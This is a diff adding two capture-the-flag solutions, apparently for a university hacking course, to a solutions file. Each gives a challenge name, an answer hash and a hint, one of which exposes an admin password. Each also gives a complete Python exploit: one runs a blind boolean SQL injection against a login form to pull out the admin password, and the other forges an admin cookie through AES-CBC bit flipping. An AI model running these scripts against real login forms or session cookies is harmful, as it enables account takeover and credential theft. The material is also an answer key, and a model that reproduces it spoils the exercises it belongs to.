@@ -876,3 +876,238 @@ def solve():
 if __name__ == '__main__':
     solve()
 -----------------------------------------------------------------------------------------------
+challenge: #Sequels are bad: Blind Edition
+solution: b0e91005e21e8328ea0fd928ba752324
+hint: Username: admin
+Password: b0e91005e21e8328ea0fd928ba752324
+#!/usr/bin/env python3
+
+import sys
+import time
+import requests
+
+TARGET = "http://shell.hackintro.di.uoa.gr:51040/login"
+
+session = requests.Session()
+
+
+def send_condition(expression: str) -> bool:
+    injected_user = f"' UNION SELECT 1,'tmp',0 WHERE {expression}-- "
+
+    for retry in range(8):
+        try:
+            response = session.post(
+                TARGET,
+                data={
+                    "user": injected_user,
+                    "password": "abc"
+                },
+                allow_redirects=False,
+                timeout=15
+            )
+
+            return "Invalid password" in response.text
+
+        except requests.RequestException:
+            time.sleep(0.5 * (retry + 1))
+
+    raise Exception("request failed")
+
+
+def get_password_size() -> int:
+    lower = 1
+    upper = 64
+
+    while send_condition(
+        f"length((SELECT password FROM users WHERE name='admin'))>{upper}"
+    ):
+        upper *= 2
+
+    while lower < upper:
+        middle = (lower + upper) // 2
+
+        result = send_condition(
+            f"length((SELECT password FROM users WHERE name='admin'))>{middle}"
+        )
+
+        if result:
+            lower = middle + 1
+        else:
+            upper = middle
+
+    return lower
+
+
+def extract_character(position: int) -> str:
+    start = 32
+    end = 126
+
+    while start < end:
+        midpoint = (start + end) // 2
+
+        sql_check = (
+            "unicode(substr("
+            "(SELECT password FROM users WHERE name='admin'),"
+            f"{position},1))>{midpoint}"
+        )
+
+        if send_condition(sql_check):
+            start = midpoint + 1
+        else:
+            end = midpoint
+
+    return chr(start)
+
+
+def run():
+    if not send_condition("1=1") or send_condition("1=2"):
+        raise RuntimeError("boolean oracle failed")
+
+    print("[+] oracle verified", flush=True)
+
+    length = get_password_size()
+    print(f"[+] detected length: {length}", flush=True)
+
+    recovered = []
+
+    for index in range(1, length + 1):
+        recovered.append(extract_character(index))
+
+        current = "".join(recovered)
+
+        print(
+            f"[{index}/{length}] -> {current}",
+            flush=True
+        )
+
+    final_password = "".join(recovered)
+
+    print(f"\n[+] admin password = {final_password}")
+
+
+if __name__ == "__main__":
+    run()
+-----------------------------------------------------------------------------------------------
+challenge: #Cooking 4
+solution: 5f82314c7ceac75c345d1b0ceae7604b
+hint: 
+#!/usr/bin/env python3
+
+import re
+import requests
+from binascii import unhexlify, hexlify
+
+# Target application
+HOST = "http://shell.hackintro.di.uoa.gr:26033"
+
+
+def chunk_blocks(blob: bytes, size: int = 16):
+    """
+    Split ciphertext into AES-sized blocks.
+    """
+    return [
+        blob[i:i + size]
+        for i in range(0, len(blob), size)
+    ]
+
+
+def forge_admin_cookie(original_cookie: str) -> str:
+    """
+    Perform CBC bit flipping on the ciphertext.
+
+    Flipping one bit in ciphertext block C1
+    modifies plaintext block P2 after decryption.
+    """
+
+    # Cookie format:
+    # IV || C0 || C1 || C2
+    iv_hex = original_cookie[:32]
+    cipher_hex = original_cookie[32:]
+
+    ciphertext = unhexlify(cipher_hex)
+
+    blocks = chunk_blocks(ciphertext)
+
+    if len(blocks) != 3:
+        raise RuntimeError("unexpected number of blocks")
+
+    # Copy second ciphertext block so we can modify it
+    manipulated = bytearray(blocks[1])
+
+    # Flip lowest bit of first byte
+    # This changes admin value from 0x00 -> 0x01
+    manipulated[0] ^= 0x01
+
+    # Rebuild modified ciphertext
+    final_cipher = (
+        blocks[0] +
+        bytes(manipulated) +
+        blocks[2]
+    )
+
+    # Return IV + modified ciphertext as hex string
+    return iv_hex + hexlify(final_cipher).decode()
+
+
+def exploit():
+    # Create persistent HTTP session
+    session = requests.Session()
+
+    # Password length chosen so plaintext aligns perfectly
+    # into 3 AES blocks
+    crafted_password = "B" * 19
+
+    # Authenticate as normal guest user
+    login_response = session.post(
+        f"{HOST}/login",
+        data={
+            "user": "guest",
+            "password": crafted_password
+        },
+        allow_redirects=False
+    )
+
+    print(f"[+] login status code: {login_response.status_code}")
+
+    # Retrieve encrypted authentication cookie
+    cookie = session.cookies.get("auth")
+
+    if cookie is None:
+        raise RuntimeError("auth cookie not found")
+
+    print(f"[+] cookie length: {len(cookie)} hex chars")
+
+    # Forge admin-enabled cookie
+    evil_cookie = forge_admin_cookie(cookie)
+
+    # Access admin endpoint with modified cookie
+    admin_page = session.get(
+        f"{HOST}/admin",
+        cookies={"auth": evil_cookie}
+    )
+
+    print(f"[+] /admin response: {admin_page.status_code}")
+
+    body = admin_page.text
+
+    print("----- server response -----")
+    print(body[:2000])
+    print("----------- end -----------")
+
+    # Try to identify possible flag patterns
+    match = re.search(
+        r"flag\{[^}]+\}|[a-f0-9]{32}|[A-Z0-9_]{8,}",
+        body
+    )
+
+    if match:
+        print(f"[+] possible flag found: {match.group(0)}")
+
+
+def main():
+    exploit()
+
+
+if __name__ == "__main__":
+    main()
+-----------------------------------------------------------------------------------------------
